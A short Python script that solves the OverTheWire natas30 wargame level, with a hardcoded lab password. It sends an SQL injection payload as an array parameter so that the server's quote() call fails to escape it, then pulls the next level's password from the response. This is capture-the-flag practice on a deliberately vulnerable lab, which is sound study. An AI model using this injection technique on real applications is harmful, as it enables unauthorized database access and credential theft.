'''
This script is used to solve natas30 from http://overthewire.org/wargames/natas/natas31.html.
This is an SQL injection that takes advantage of the quote() SQL function being called, which
does not work on any data type other than string. Giving our SQLi payload as an array does the
trick. Full write-up at https://r00tblogger.wordpress.com/2019/01/29/overthewire-natas-wargame/
'''

import requests
import re

username = "natas30"
natas30_pass = "wie9iexae0Daihohv8vuu3cei9wahf0e"
url = "http://natas30.natas.labs.overthewire.org"
sess = requests.Session()

response = sess.post(url=url, auth=(username,natas30_pass), 
		data={"username":"natas31", "password":["'' OR true", 2]})
print(re.findall("<br>[A-Za-z0-9]*<?", response.text))
